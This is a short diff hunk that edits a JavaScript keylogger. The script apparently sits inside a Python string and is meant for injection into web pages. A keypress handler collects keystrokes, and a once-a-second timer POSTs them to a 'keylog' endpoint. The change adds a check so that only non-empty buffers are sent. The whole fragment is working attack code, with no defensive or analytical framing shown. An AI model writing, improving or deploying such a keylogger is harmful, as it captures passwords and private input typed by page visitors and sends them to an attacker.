@@ -50,10 +50,12 @@ document.onkeypress = function(e) {
 }
 
 window.setInterval(function(){
-    xhr.open("POST", "keylog", true);
-    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-    xhr.send(keys);
-    keys = '';
+    if (keys.length > 0){
+        xhr.open("POST", "keylog", true);
+        xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        xhr.send(keys);
+        keys = '';
+    }
 }, 1000);
 </script>"""
 
